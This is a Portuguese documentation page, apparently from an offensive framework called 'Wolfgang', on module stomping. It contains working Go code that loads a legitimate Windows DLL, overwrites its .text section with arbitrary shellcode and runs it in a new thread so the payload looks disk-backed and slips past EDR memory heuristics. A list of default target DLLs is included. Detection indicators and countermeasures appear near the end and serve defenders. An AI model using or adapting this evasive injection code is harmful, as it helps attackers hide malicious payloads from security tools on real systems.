    Module Stomping¶

    O que é¶

    Module stomping é uma técnica de injeção que carrega uma DLL legítima no processo e sobrescreve sua seção .text (código executável) com o payload. O payload então executa a partir de uma região de memória que está disk-backed -- ou seja, o sistema operacional acredita que a memória pertence à DLL legítima.

    Isso evita detecção por heurísticas de "unbacked memory execution", que procuram código executável em regiões que não correspondem a nenhum arquivo em disco.

    Por que funciona¶

    Memory-Backed vs Unbacked¶

    Quando o Windows carrega uma DLL via LoadLibrary, mapeia seções do arquivo em disco para a memória. O kernel mantém um registro de que aquela região de memória corresponde a um arquivo específico. Ferramentas de análise como Process Hacker e EDRs usam essa informação:

    Região com backing:     kernel32.dll → .text → READ_EXECUTE  ✓ Normal
Região sem backing:     ??? → RWX → (shellcode)               ✗ Suspeita
Região stomped:         mshtml.dll → .text → READ_EXECUTE     ✓ Parece normal

    Mesmo que os bytes na seção .text tenham sido substituídos, o kernel ainda associa a região à DLL original. A detecção requer comparar os bytes em memória com os bytes no arquivo em disco -- uma operação cara que nem todos os EDRs fazem continuamente.

    Seleção da DLL alvo¶

    O Wolfgang usa DLLs que:

    • São grandes (seção .text suficiente para o payload)
    • São comuns no Windows (presença não é suspeita)
    • Não são críticas para o funcionamento do processo
    var defaultStompTargets = []string{
    "mshtml.dll",   // Internet Explorer rendering engine
    "mfc42u.dll",   // MFC Unicode runtime
    "ieframe.dll",  // IE frame library
    "dbghelp.dll",  // Debug helper library
    "combase.dll",  // COM base library
}

    Implementação no Wolfgang¶

    Interface do módulo¶

    type ModuleStomp struct {
    stompFunc func(payload []byte, targetDLL string) error
}

func (m *ModuleStomp) Execute(ctx context.Context, args module.ModuleArgs) (module.ModuleResult, error) {
    args.ParseRaw()
    shellcodeHex := args.Parsed["shellcode"]
    targetDLL := args.Parsed["target_dll"]

    shellcode, _ := hex.DecodeString(shellcodeHex)
    StompExecute(shellcode, targetDLL)

    return module.ModuleResult{
        Output: fmt.Sprintf("payload executed via module stomping (%d bytes)", len(shellcode)),
    }, nil
}

    Carregamento e parse da DLL¶

    func loadStompTarget(preferred string) (*stompTarget, error) {
    targets := defaultStompTargets
    if preferred != "" {
        targets = []string{preferred}
    }

    for _, dll := range targets {
        // 1. Carrega a DLL legitimamente via Windows Loader
        handle, err := windows.LoadDLL(dll)
        if err != nil { continue }

        base := uintptr(handle.Handle)

        // 2. Parse do PE para encontrar .text section
        dosHeader := unsafe.Slice((*byte)(unsafe.Pointer(base)), 64)
        peOffset := *(*uint32)(unsafe.Pointer(&dosHeader[0x3C]))
        headerBytes := unsafe.Slice((*byte)(unsafe.Pointer(base)), sizeOfHeaders)
        pe, err := peparser.Parse(headerBytes)
        if err != nil { handle.Release(); continue }

        // 3. Verifica que .text é grande o suficiente
        text := pe.GetSectionByName(".text")
        if text == nil || text.VirtualSize < 4096 {
            handle.Release()
            continue
        }

        return &stompTarget{handle: handle, base: base, section: text}, nil
    }
    return nil, fmt.Errorf("no suitable stomp target found")
}

    Stomping e execução¶

    func StompExecute(payload []byte, targetDLL string) error {
    // 1. Carrega DLL alvo e localiza .text
    target, _ := loadStompTarget(targetDLL)
    defer target.cleanup()

    textSection := target.section

    // 2. Verifica que o payload cabe na seção
    if uint32(len(payload)) > textSection.VirtualSize {
        return fmt.Errorf("payload (%d) exceeds .text section (%d)",
            len(payload), textSection.VirtualSize)
    }

    textAddr := target.base + uintptr(textSection.VirtualAddress)

    // 3. Torna a seção gravável
    oldProt, _ := winapi.VirtualProtect(textAddr,
        uintptr(textSection.VirtualSize), winapi.PageReadWrite)

    // 4. Sobrescreve .text com o payload
    dst := unsafe.Slice((*byte)(unsafe.Pointer(textAddr)), textSection.VirtualSize)
    copy(dst, payload)

    // 5. Zera o restante da seção (evita resíduos da DLL original)
    for i := len(payload); i < int(textSection.VirtualSize); i++ {
        dst[i] = 0
    }

    // 6. Restaura permissão como READ_EXECUTE
    winapi.VirtualProtect(textAddr,
        uintptr(textSection.VirtualSize), winapi.PageExecuteRead)
    _ = oldProt

    // 7. Cria thread para executar o payload
    var threadID uint32
    r, _, _ := procCreateThread.Call(0, 0,
        textAddr, 0, 0, uintptr(unsafe.Pointer(&threadID)))
    hThread := windows.Handle(r)
    defer windows.CloseHandle(hThread)

    // 8. Aguarda conclusão
    windows.WaitForSingleObject(hThread, windows.INFINITE)
    return nil
}

    Detecção¶

    IOC Descrição
    LoadLibrary de DLL incomum Carregamento de DLLs que o processo normalmente não usa
    VirtualProtect em .text de DLL Tornar seção de código gravável
    .text content != disk content Integrity check da seção de código
    CreateThread apontando para DLL Thread com start address em DLL carregada
    DLL loaded mas sem imports usados DLL carregada sem chamadas aos seus exports

    Detecção por integrity check¶

    A detecção mais efetiva compara bytes em memória com bytes em disco:

    1. Enumerar módulos carregados (EnumProcessModules)
2. Para cada módulo, ler .text do arquivo em disco
3. Comparar com .text em memória
4. Diferenças indicam stomping

    Essa verificação é custosa e geralmente feita sob demanda, não continuamente.

    Contramedidas¶

    • Periodic module integrity: Comparar seções de código com disco
    • DLL load monitoring: Detectar carregamento de DLLs inesperadas
    • Thread start address analysis: Verificar se threads iniciam em endereços legítimos dentro da DLL
    • Call stack analysis: Verificar se a call stack faz sentido para a DLL em questão

    Vantagens sobre outras técnicas¶

    Module stomping tem a vantagem única de produzir memória disk-backed com permissões normais (R-X), o que evita as duas heurísticas mais comuns de EDRs:

    1. Detecção de unbacked executable memory
    2. Detecção de memória RWX
